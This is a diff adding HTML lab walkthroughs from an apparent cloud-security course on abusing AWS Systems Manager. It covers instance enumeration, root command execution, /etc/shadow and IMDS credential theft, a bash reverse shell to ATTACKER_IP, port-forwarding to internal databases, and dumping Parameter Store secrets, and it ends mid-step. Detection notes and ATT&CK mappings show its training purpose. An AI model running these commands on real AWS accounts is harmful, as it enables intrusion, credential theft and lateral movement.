@@ -1,0 +1,709 @@
+<!-- M08: SSM Execution Labs -->
+
+<!-- Lab 1: Discovering SSM-Managed Instances -->
+<div class="lab-walkthrough-content" id="M08-L01-content">
+  <div class="lab-objective">
+    <i class="fa-solid fa-crosshairs"></i>
+    <strong>Objective:</strong> Enumerate all Systems Manager-managed EC2 instances, correlate with EC2 metadata, and identify high-value targets for remote command execution.
+  </div>
+
+  <div class="lab-prereqs">
+    <strong>Prerequisites:</strong>
+    <ul>
+      <li>AWS credentials with <code>ssm:DescribeInstanceInformation</code> and <code>ec2:DescribeInstances</code> permissions — the <code>stolen</code> profile from M06-L01 works if the EC2 role has SSM read access</li>
+      <li>AWS CLI v2 installed and configured (<code>aws --version</code> must show 2.x)</li>
+      <li><code>jq</code> installed on the attacker machine for JSON parsing</li>
+      <li>No prior M08 lab dependency — this is the entry point for the M08 chain</li>
+      <li>Lab environment pre-deployed with multiple EC2 instances running the SSM agent with varying platform types (Linux and Windows)</li>
+    </ul>
+  </div>
+
+  <div class="lab-steps">
+    <div class="lab-step">
+      <span class="step-num">1</span>
+      <div class="step-content">
+        <div class="step-desc">List all instances managed by SSM, filtering for Online status only — offline instances cannot receive commands. The <code>--filters</code> flag narrows results to reachable targets and reduces noise. Include platform type, IP address, hostname, and connectivity status for target prioritization.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ aws ssm describe-instance-information \
+  --filters Key=PingStatus,Values=Online \
+  --query 'InstanceInformationList[*].[InstanceId,PlatformType,PlatformName,IPAddress,ComputerName,PingStatus]' \
+  --output table</div>
+            <div class="terminal-output">---------------------------------------------------------------------------------------
+|                           DescribeInstanceInformation                                |
++-------------+----------+------------------+-------------+------------------+---------+
+|  i-0abc123  |  Linux   |  Amazon Linux 2  |  10.0.1.50  |  prod-web-01     |  Online |
+|  i-0def456  |  Linux   |  Ubuntu 22.04    |  10.0.2.30  |  prod-db-01      |  Online |
+|  i-0ghi789  |  Linux   |  Amazon Linux 2  |  10.0.1.51  |  prod-web-02     |  Online |
+|  i-0jkl012  |  Windows |  Windows Srv 22  |  10.0.3.10  |  bastion-win-01  |  Online |
++-------------+----------+------------------+-------------+------------------+---------+</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="lab-step">
+      <span class="step-num">2</span>
+      <div class="step-content">
+        <div class="step-desc">Cross-reference SSM instances with EC2 metadata to get tags, instance types, and network details for target prioritization. Instance type and tags reveal the role of each machine — memory-optimized types often run databases, large web instances often have application secrets.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ aws ec2 describe-instances \
+  --instance-ids i-0abc123 i-0def456 i-0ghi789 i-0jkl012 \
+  --query 'Reservations[*].Instances[*].[Tags[?Key==`Name`].Value|[0],PrivateIpAddress,InstanceType]' \
+  --output table</div>
+            <div class="terminal-output">------------------------------------------
+|           DescribeInstances            |
++------------------+-------------+-------+
+|  prod-web-01     |  10.0.1.50  | t3.large  |
+|  prod-db-01      |  10.0.2.30  | r5.xlarge |
+|  prod-web-02     |  10.0.1.51  | t3.large  |
+|  bastion-win-01  |  10.0.3.10  | t3.medium |
++------------------+-------------+-------+</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="lab-step">
+      <span class="step-num">3</span>
+      <div class="step-content">
+        <div class="step-desc">Check the SSM agent version and last ping time for each instance. Outdated agents may have known vulnerabilities, and recent ping times confirm active connectivity. The <code>IsLatestVersion: False</code> flag on prod-db-01 is worth noting for vulnerability research.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ aws ssm describe-instance-information \
+  --query 'InstanceInformationList[*].[InstanceId,AgentVersion,LastPingDateTime,IsLatestVersion]' \
+  --output table</div>
+            <div class="terminal-output">--------------------------------------------------------------
+|                DescribeInstanceInformation                  |
++-------------+----------+---------------------------+-------+
+|  i-0abc123  |  3.2.1   |  2024-01-15T10:45:00Z     |  True |
+|  i-0def456  |  3.1.0   |  2024-01-15T10:44:30Z     | False |
+|  i-0ghi789  |  3.2.1   |  2024-01-15T10:45:15Z     |  True |
+|  i-0jkl012  |  3.2.1   |  2024-01-15T10:43:00Z     |  True |
++-------------+----------+---------------------------+-------+</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="lab-step">
+      <span class="step-num">4</span>
+      <div class="step-content">
+        <div class="step-desc">Identify high-value targets by their naming conventions and tags. Production databases, bastions, and admin instances are prime targets for credential harvesting and lateral movement. When SSM permissions are unavailable for direct enumeration, fall back to EC2 tag-based discovery to identify likely SSM-managed instances.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd"># High-value target identification:</div>
+            <div class="terminal-output">[HIGH] prod-db-01 (i-0def456) - Production database server
+  → Likely contains database credentials, connection strings
+  → r5.xlarge = memory-optimized, likely running RDS proxy or direct DB
+
+[HIGH] bastion-win-01 (i-0jkl012) - Windows bastion host
+  → Likely has RDP sessions, cached credentials, admin tools
+  → Gateway to internal network segments
+
+[MED]  prod-web-01/02 (i-0abc123, i-0ghi789) - Production web servers
+  → Application configs, environment variables, service account creds
+  → IMDS credentials for web-tier IAM role</div>
+            <div class="terminal-cmd"># EC2 tag-based fallback when ssm:DescribeInstanceInformation is denied:</div>
+            <div class="terminal-cmd">$ aws ec2 describe-instances \
+  --filters "Name=tag:SSMManaged,Values=true" \
+  --query 'Reservations[*].Instances[*].[InstanceId,Tags[?Key==`Name`].Value|[0]]' \
+  --output table</div>
+            <div class="terminal-output">+-------------+------------------+
+|  i-0abc123  |  prod-web-01     |
+|  i-0def456  |  prod-db-01      |
++-------------+------------------+</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="lab-step">
+      <span class="step-num">5</span>
+      <div class="step-content">
+        <div class="step-desc">Verify your IAM permissions for SSM operations before attempting command execution. This avoids triggering access-denied alerts from failed API calls and confirms exactly which actions are available with the current credentials.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ aws iam simulate-principal-policy \
+  --policy-source-arn arn:aws:iam::123456789012:user/stolen \
+  --action-names ssm:SendCommand ssm:StartSession ssm:GetCommandInvocation \
+  --query 'EvaluationResults[*].[EvalActionName,EvalDecision]' --output table</div>
+            <div class="terminal-output">---------------------------------------------------
+|            SimulatePrincipalPolicy              |
++-------------------------------+-----------------+
+|  ssm:SendCommand              |  allowed        |
+|  ssm:StartSession             |  allowed        |
+|  ssm:GetCommandInvocation     |  allowed        |
++-------------------------------+-----------------+</div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="attack-flow">
+    <div class="flow-title"><i class="fa-solid fa-diagram-project"></i> Attack Flow</div>
+    <div class="flow-diagram">
+      <div class="flow-node">List SSM Instances (Online)</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">Cross-Ref EC2</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">Identify Targets</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">Verify Permissions</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">Execute</div>
+    </div>
+  </div>
+
+  <div class="lab-note">
+    <i class="fa-solid fa-triangle-exclamation"></i> <strong>Detection Note:</strong> <code>ssm:DescribeInstanceInformation</code> is logged to CloudTrail. Bulk enumeration by a credential that is not a recognized automation role is anomalous. SSM-managed instances do not require SSH keys, open inbound ports, or network connectivity from the attacker — the SSM agent phones home to the AWS API, making these instances accessible from anywhere with valid AWS credentials. MITRE ATT&CK: <a href="https://attack.mitre.org/techniques/T1526/" target="_blank">T1526 — Cloud Service Discovery</a>.
+  </div>
+
+  <div class="lab-cleanup">
+    <strong>Cleanup:</strong>
+    <ul>
+      <li>No AWS resources are created during enumeration — no infrastructure to tear down</li>
+      <li>Remove any credential profiles used during this lab from <code>~/.aws/credentials</code> and <code>~/.aws/config</code></li>
+    </ul>
+  </div>
+</div>
+
+<hr class="lab-divider">
+
+<!-- Lab 2: RCE via SSM SendCommand -->
+<div class="lab-walkthrough-content" id="M08-L02-content">
+  <div class="lab-objective">
+    <i class="fa-solid fa-crosshairs"></i>
+    <strong>Objective:</strong> Achieve remote code execution on EC2 instances via SSM SendCommand, extract sensitive data, steal IMDS credentials, and establish a reverse shell.
+  </div>
+
+  <div class="lab-prereqs">
+    <strong>Prerequisites:</strong>
+    <ul>
+      <li>Completion of M08-L01 — you must have identified Online SSM-managed instances and their instance IDs</li>
+      <li>AWS credentials with <code>ssm:SendCommand</code> and <code>ssm:GetCommandInvocation</code> permissions</li>
+      <li>AWS CLI v2 on the attacker machine</li>
+      <li>For the reverse shell step: a publicly reachable listener IP (<code>ATTACKER_IP</code>) with port 4444 open and <code>nc</code> (netcat) installed</li>
+      <li>Target instance must be running Linux for the bash reverse shell; adjust to PowerShell syntax for Windows targets</li>
+    </ul>
+  </div>
+
+  <div class="lab-steps">
+    <div class="lab-step">
+      <span class="step-num">1</span>
+      <div class="step-content">
+        <div class="step-desc">Send a shell command to the target instance via SSM. The command runs as root (Linux) or SYSTEM (Windows) by default. <strong>Critical:</strong> <code>send-command</code> is asynchronous — it returns a <code>CommandId</code> immediately but the command has not yet executed. You must capture the ID and poll for results separately.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ CMD_ID=$(aws ssm send-command \
+  --instance-ids "i-0abc123" \
+  --document-name "AWS-RunShellScript" \
+  --parameters 'commands=["id","whoami","hostname","cat /etc/os-release"]' \
+  --query 'Command.CommandId' --output text)
+$ echo "Command ID: $CMD_ID"</div>
+            <div class="terminal-output">Command ID: cmd-0a1b2c3d4e5f67890</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="lab-step">
+      <span class="step-num">2</span>
+      <div class="step-content">
+        <div class="step-desc">Poll for the command result using the captured <code>CommandId</code>. Wait a few seconds before the first poll — the SSM agent must receive the command, execute it, and post results. Check both <code>Status</code> and <code>StandardOutputContent</code> together. The results confirm root-level execution on the target.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ sleep 5</div>
+            <div class="terminal-cmd">$ aws ssm get-command-invocation \
+  --command-id "$CMD_ID" \
+  --instance-id "i-0abc123" \
+  --query '[Status,StandardOutputContent]'</div>
+            <div class="terminal-output">[
+    "Success",
+    "uid=0(root) gid=0(root) groups=0(root)\nroot\nprod-web-01\nNAME=\"Amazon Linux\"\nVERSION=\"2\"\nID=\"amzn\"\nID_LIKE=\"centos rhel fedora\"\nVERSION_ID=\"2\"\nPRETTY_NAME=\"Amazon Linux 2\"\n"
+]</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="lab-step">
+      <span class="step-num">3</span>
+      <div class="step-content">
+        <div class="step-desc">Read sensitive system files. With root access via SSM, password hashes and other protected files are directly accessible. Note that each <code>send-command</code> call is async — always capture the new <code>CMD_ID</code> and poll for results.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ CMD_ID=$(aws ssm send-command \
+  --instance-ids "i-0abc123" \
+  --document-name "AWS-RunShellScript" \
+  --parameters 'commands=["cat /etc/shadow"]' \
+  --query 'Command.CommandId' --output text)</div>
+            <div class="terminal-cmd">$ sleep 5 && aws ssm get-command-invocation \
+  --command-id "$CMD_ID" \
+  --instance-id "i-0abc123" \
+  --query 'StandardOutputContent' --output text</div>
+            <div class="terminal-output">root:$6$rounds=4096$sAlT$hashEXAMPLE...:19370:0:99999:7:::
+bin:*:18353:0:99999:7:::
+daemon:*:18353:0:99999:7:::
+ec2-user:$6$rounds=4096$xYz$anotherHashEXAMPLE...:19370:0:99999:7:::
+webapp:$6$rounds=4096$AbC$webappHashEXAMPLE...:19375:0:99999:7:::</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="lab-step">
+      <span class="step-num">4</span>
+      <div class="step-content">
+        <div class="step-desc">Steal IMDS credentials from the target instance via SSM command execution. This provides the instance's IAM role credentials for further AWS API access. The inline shell command performs the two-step IMDS role-name discovery and credential fetch in a single command string.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ CMD_ID=$(aws ssm send-command \
+  --instance-ids "i-0abc123" \
+  --document-name "AWS-RunShellScript" \
+  --parameters 'commands=["ROLE=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/) && curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE"]' \
+  --query 'Command.CommandId' --output text)</div>
+            <div class="terminal-cmd">$ sleep 5 && aws ssm get-command-invocation \
+  --command-id "$CMD_ID" \
+  --instance-id "i-0abc123" \
+  --query 'StandardOutputContent' --output text</div>
+            <div class="terminal-output">{
+  "Code" : "Success",
+  "LastUpdated" : "2024-01-15T10:30:00Z",
+  "Type" : "AWS-HMAC",
+  "AccessKeyId" : "ASIAZQ3DWEBSERVERKEY",
+  "SecretAccessKey" : "WebServerSecretEXAMPLE/K7MDENG",
+  "Token" : "FwoGZXIvYXdzEBYaDWebServer...truncated...",
+  "Expiration" : "2024-01-15T16:45:00Z"
+}</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="lab-step">
+      <span class="step-num">5</span>
+      <div class="step-content">
+        <div class="step-desc">Establish a reverse shell for interactive access. Start the listener on your attacker machine first, then send the reverse shell command via SSM. This gives a persistent foothold beyond the SSM command-response pattern. The SSM agent executes the bash reverse shell as root, connecting back to your listener.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd"># Start listener on attacker machine (separate terminal):</div>
+            <div class="terminal-cmd">$ nc -lvnp 4444</div>
+            <div class="terminal-output">Listening on 0.0.0.0 4444</div>
+            <div class="terminal-cmd"># Send reverse shell via SSM (replace ATTACKER_IP with your IP):</div>
+            <div class="terminal-cmd">$ CMD_ID=$(aws ssm send-command \
+  --instance-ids "i-0abc123" \
+  --document-name "AWS-RunShellScript" \
+  --parameters 'commands=["bash -c '\''bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'\''"]' \
+  --query 'Command.CommandId' --output text)</div>
+            <div class="terminal-output"># Listener receives connection:
+Connection received on 10.0.1.50 48234
+root@prod-web-01:/# id
+uid=0(root) gid=0(root) groups=0(root)
+root@prod-web-01:/# hostname
+prod-web-01</div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="attack-flow">
+    <div class="flow-title"><i class="fa-solid fa-diagram-project"></i> Attack Flow</div>
+    <div class="flow-diagram">
+      <div class="flow-node">Attacker</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">AWS API (SendCommand)</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">SSM Agent</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">Shell Execution (root)</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">Poll GetCommandInvocation</div>
+    </div>
+  </div>
+
+  <div class="lab-note">
+    <i class="fa-solid fa-triangle-exclamation"></i> <strong>Detection Note:</strong> <code>ssm:SendCommand</code> IS logged to CloudTrail. Look for <code>SendCommand</code> events where the caller is not a recognized automation identity, or where the document is <code>AWS-RunShellScript</code> targeting production instances. Commands execute as root/SYSTEM by default — no privilege escalation needed. SSM bypasses security groups entirely — no inbound ports required. MITRE ATT&CK: <a href="https://attack.mitre.org/techniques/T1651/" target="_blank">T1651 — Cloud Administration Command</a>.
+  </div>
+
+  <div class="lab-cleanup">
+    <strong>Cleanup:</strong>
+    <ul>
+      <li>Terminate any active reverse shell sessions: type <code>exit</code> in the shell or kill the netcat listener with <code>Ctrl+C</code></li>
+      <li>SSM command execution is ephemeral — no persistent processes are left unless you explicitly installed something</li>
+      <li>Remove any credential profiles configured from the stolen IMDS credentials</li>
+      <li>If the reverse shell spawned a child process on the target instance, kill it via another <code>send-command</code>: <code>commands=["pkill -f 'bash -i'"]</code></li>
+    </ul>
+  </div>
+</div>
+
+<hr class="lab-divider">
+
+<!-- Lab 3: Session Manager Interactive Shell -->
+<div class="lab-walkthrough-content" id="M08-L03-content">
+  <div class="lab-objective">
+    <i class="fa-solid fa-crosshairs"></i>
+    <strong>Objective:</strong> Use SSM Session Manager to establish an interactive shell on target instances, enumerate the system, pivot using the instance's IAM role, and leverage port-forwarding to reach internal services.
+  </div>
+
+  <div class="lab-prereqs">
+    <strong>Prerequisites:</strong>
+    <ul>
+      <li>Completion of M08-L01 — you must have identified Online SSM-managed instance IDs</li>
+      <li>AWS credentials with <code>ssm:StartSession</code> and <code>ssm:TerminateSession</code> permissions</li>
+      <li>AWS CLI v2 on the attacker machine</li>
+      <li>Session Manager plugin installed separately from the AWS CLI — the plugin is not included in the AWS CLI package and must be installed independently (see step 1)</li>
+      <li>For port-forwarding: knowledge of internal service ports on target instances (e.g., 3306 for MySQL, 5432 for PostgreSQL)</li>
+    </ul>
+  </div>
+
+  <div class="lab-steps">
+    <div class="lab-step">
+      <span class="step-num">1</span>
+      <div class="step-content">
+        <div class="step-desc">Install the Session Manager plugin for the AWS CLI. This plugin is a hard requirement — <code>aws ssm start-session</code> will fail with an error if the plugin is not installed. It must be installed separately from the AWS CLI itself.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd"># macOS (Intel and Apple Silicon):</div>
+            <div class="terminal-cmd">$ curl "https://s3.amazonaws.com/session-manager-downloads/plugin/latest/mac/sessionmanager-bundle.zip" \
+  -o "sessionmanager-bundle.zip"</div>
+            <div class="terminal-cmd">$ unzip sessionmanager-bundle.zip</div>
+            <div class="terminal-cmd">$ sudo ./sessionmanager-bundle/install -i /usr/local/sessionmanagerplugin \
+  -b /usr/local/bin/session-manager-plugin</div>
+            <div class="terminal-output">Creating install directories...
+Installing Session Manager Plugin to /usr/local/sessionmanagerplugin
+Successfully installed Session Manager Plugin</div>
+            <div class="terminal-cmd"># Linux (Debian/Ubuntu):</div>
+            <div class="terminal-cmd">$ curl "https://s3.amazonaws.com/session-manager-downloads/plugin/latest/ubuntu_64bit/session-manager-plugin.deb" \
+  -o "session-manager-plugin.deb"</div>
+            <div class="terminal-cmd">$ sudo dpkg -i session-manager-plugin.deb</div>
+            <div class="terminal-output">Selecting previously unselected package session-manager-plugin.
+Unpacking session-manager-plugin ...
+Setting up session-manager-plugin ...</div>
+            <div class="terminal-cmd"># Verify installation:</div>
+            <div class="terminal-cmd">$ session-manager-plugin --version</div>
+            <div class="terminal-output">1.2.553.0</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="lab-step">
+      <span class="step-num">2</span>
+      <div class="step-content">
+        <div class="step-desc">Start an interactive session. This opens a shell directly through the AWS API without needing SSH, open ports, or keys. The session starts as <code>ssm-user</code> — use <code>sudo su -</code> to escalate to root. Session traffic is encrypted and goes through AWS service endpoints.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ aws ssm start-session --target i-0abc123</div>
+            <div class="terminal-output">Starting session with SessionId: attacker-0a1b2c3d4e5f6
+This session is encrypted using AWS KMS.
+
+$ whoami
+ssm-user
+$ sudo su -
+root@prod-web-01:~#</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="lab-step">
+      <span class="step-num">3</span>
+      <div class="step-content">
+        <div class="step-desc">Enumerate the system interactively: users, processes, environment variables, and AWS configuration. From inside the instance, the AWS CLI automatically uses the instance role credentials via IMDS — no separate credential configuration needed.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ ls /home/</div>
+            <div class="terminal-output">ec2-user  webapp  deploy</div>
+            <div class="terminal-cmd">$ cat /etc/passwd | grep -v nologin | grep -v false</div>
+            <div class="terminal-output">root:x:0:0:root:/root:/bin/bash
+ec2-user:x:1000:1000:EC2 Default User:/home/ec2-user:/bin/bash
+webapp:x:1001:1001:Web Application:/home/webapp:/bin/bash
+deploy:x:1002:1002:Deployment User:/home/deploy:/bin/bash</div>
+            <div class="terminal-cmd">$ env | grep -i aws</div>
+            <div class="terminal-output">AWS_DEFAULT_REGION=us-east-1
+AWS_REGION=us-east-1</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="lab-step">
+      <span class="step-num">4</span>
+      <div class="step-content">
+        <div class="step-desc">Pivot using the instance's IAM role. From inside the instance, the AWS CLI automatically uses the instance role credentials via IMDS. Enumerate S3 buckets and download sensitive configuration files from the deployment bucket.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ aws sts get-caller-identity</div>
+            <div class="terminal-output">{
+    "UserId": "AROAZQ3DWEBSRVROLE:i-0abc123",
+    "Account": "123456789012",
+    "Arn": "arn:aws:sts::123456789012:assumed-role/WebServerRole/i-0abc123"
+}</div>
+            <div class="terminal-cmd">$ aws s3 ls</div>
+            <div class="terminal-output">2023-06-15 08:00:00 prod-assets-bucket
+2023-09-01 12:00:00 prod-backups-bucket
+2023-11-20 16:00:00 prod-logs-bucket
+2024-01-10 09:00:00 config-deployment-bucket</div>
+            <div class="terminal-cmd">$ aws s3 ls s3://config-deployment-bucket/</div>
+            <div class="terminal-output">2024-01-14 10:30:00     2048 .env.production
+2024-01-14 10:30:00     1024 database.yml
+2024-01-14 10:30:00      512 secrets.json</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="lab-step">
+      <span class="step-num">5</span>
+      <div class="step-content">
+        <div class="step-desc">Use Session Manager port-forwarding to tunnel directly to internal services (e.g., the production database on port 3306) without requiring any network-level connectivity. This capability is particularly powerful for reaching services in private subnets that are inaccessible from the internet. Run this from your attacker machine, not from inside the session.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd"># Forward remote port 3306 to local port 3306 through SSM tunnel:</div>
+            <div class="terminal-cmd">$ aws ssm start-session \
+  --target i-0def456 \
+  --document-name AWS-StartPortForwardingSession \
+  --parameters portNumber=3306,localPortNumber=3306</div>
+            <div class="terminal-output">Starting session with SessionId: attacker-portfwd-0a1b2c3d
+Port 3306 opened for sessionId attacker-portfwd-0a1b2c3d.
+Waiting for connections...</div>
+            <div class="terminal-cmd"># In a second terminal, connect to the forwarded port:</div>
+            <div class="terminal-cmd">$ mysql -h 127.0.0.1 -P 3306 -u admin -p</div>
+            <div class="terminal-output">Enter password: (use credentials from Parameter Store or .env file)
+Welcome to the MySQL monitor. Commands end with ; or \g.
+mysql&gt;</div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="attack-flow">
+    <div class="flow-title"><i class="fa-solid fa-diagram-project"></i> Attack Flow</div>
+    <div class="flow-diagram">
+      <div class="flow-node">Install Plugin</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">Start Session</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">Interactive Shell</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">Enumerate System + IAM Role</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">Port-Forward to Internal Services</div>
+    </div>
+  </div>
+
+  <div class="lab-note">
+    <i class="fa-solid fa-triangle-exclamation"></i> <strong>Detection Note:</strong> Session Manager traffic is encrypted and goes through AWS service endpoints — invisible to VPC Flow Logs and traditional network monitoring. The only detection surface is CloudTrail (<code>ssm:StartSession</code> API call) and SSM Session Manager audit logs if enabled. <code>ssm:StartPortForwardingSession</code> is also logged. Monitor for sessions from unexpected source IPs or to sensitive instance types (e.g., database instances). MITRE ATT&CK: <a href="https://attack.mitre.org/techniques/T1651/" target="_blank">T1651 — Cloud Administration Command</a>.
+  </div>
+
+  <div class="lab-cleanup">
+    <strong>Cleanup:</strong>
+    <ul>
+      <li>Terminate active sessions: type <code>exit</code> in the session shell, or run <code>aws ssm terminate-session --session-id &lt;session-id&gt;</code></li>
+      <li>Close any active port-forwarding sessions with <code>Ctrl+C</code></li>
+      <li>List all active sessions to confirm none are left open: <code>aws ssm describe-sessions --state Active</code></li>
+      <li>No AWS resources are created by Session Manager itself — no infrastructure to tear down</li>
+    </ul>
+  </div>
+</div>
+
+<hr class="lab-divider">
+
+<!-- Lab 4: SSM Parameter Store Enumeration -->
+<div class="lab-walkthrough-content" id="M08-L04-content">
+  <div class="lab-objective">
+    <i class="fa-solid fa-crosshairs"></i>
+    <strong>Objective:</strong> Enumerate SSM Parameter Store to discover and extract stored secrets, database credentials, API keys, and connection strings.
+  </div>
+
+  <div class="lab-prereqs">
+    <strong>Prerequisites:</strong>
+    <ul>
+      <li>AWS credentials with <code>ssm:DescribeParameters</code>, <code>ssm:GetParameter</code>, and <code>ssm:GetParametersByPath</code> permissions — the WebServerRole stolen via Session Manager in L03 typically has these permissions to access application secrets</li>
+      <li>AWS CLI v2 on the attacker machine</li>
+      <li>For SecureString decryption: the identity must also have <code>kms:Decrypt</code> on the KMS key used to encrypt the parameter; if the key uses the default AWS-managed SSM key, this is often automatically granted to IAM roles in the same account</li>
+      <li><code>jq</code> and <code>psql</code> (or <code>mysql</code>) installed for credential validation</li>
+    </ul>
+  </div>
+
+  <div class="lab-steps">
+    <div class="lab-step">
+      <span class="step-num">1</span>
+      <div class="step-content">
+        <div class="step-desc">List all parameters in the Parameter Store to discover the naming hierarchy and identify potential secrets by their names and descriptions. Parameter names often reveal their purpose — look for paths containing <code>password</code>, <code>secret</code>, <code>key</code>, or <code>token</code>.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ aws ssm describe-parameters \
+  --query 'Parameters[*].[Name,Type,Description]' --output table</div>
+            <div class="terminal-output">--------------------------------------------------------------------------
+|                        DescribeParameters                              |
++----------------------------+----------------+---------------------------+
+|  /prod/db/password         |  SecureString  |  Production DB password   |
+|  /prod/db/host             |  String        |  Production DB endpoint   |
+|  /prod/db/username         |  String        |  Production DB username   |
+|  /api/stripe-key           |  SecureString  |  Stripe API secret key    |
+|  /api/sendgrid-token       |  SecureString  |  SendGrid API token       |
+|  /app/jwt-secret           |  SecureString  |  JWT signing secret       |
+|  /deploy/github-token      |  SecureString  |  GitHub deploy token      |
+|  /config/redis-url         |  String        |  Redis connection string  |
+|  /config/feature-flags     |  String        |  Feature flag config      |
++----------------------------+----------------+---------------------------+</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="lab-step">
+      <span class="step-num">2</span>
+      <div class="step-content">
+        <div class="step-desc">Retrieve all parameters recursively with decryption enabled. The <code>--with-decryption</code> flag decrypts SecureString parameters if you have the required KMS permissions. The <code>--recursive</code> flag traverses all path prefixes. This single command dumps the entire Parameter Store including all secrets.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ aws ssm get-parameters-by-path \
+  --path "/" --recursive --with-decryption \
+  --query 'Parameters[*].[Name,Value]' --output table</div>
+            <div class="terminal-output">---------------------------------------------------------------------------------
+|                          GetParametersByPath                                  |
++----------------------------+--------------------------------------------------+
+|  /prod/db/password         |  Pr0dP@ssw0rd!2024                               |
+|  /prod/db/host             |  prod-db.cxyz123abc.us-east-1.rds.amazonaws.com   |
+|  /prod/db/username         |  admin                                            |
+|  /api/stripe-key           |  sk_live_4eC39HqLyjWDarjtT1zdp7dc                 |
+|  /api/sendgrid-token       |  SG.xYzAbCdEfG.1234567890abcdef                   |
+|  /app/jwt-secret           |  s3cr3t-jwt-k3y-d0-n0t-sh4r3                      |
+|  /deploy/github-token      |  ghp_1234567890abcdefghijklmnopqrstuv             |
+|  /config/redis-url         |  redis://prod-cache.abc123.ng.0001.use1.cache...  |
+|  /config/feature-flags     |  {"dark_mode":true,"beta_api":false}              |
++----------------------------+--------------------------------------------------+</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="lab-step">
+      <span class="step-num">3</span>
+      <div class="step-content">
+        <div class="step-desc">Filter parameters specifically for credential-related entries using keyword-based parameter filters. This is useful when you want to pull only SecureString types or narrow results in large environments with hundreds of parameters.</div>
+        <div class="terminal">
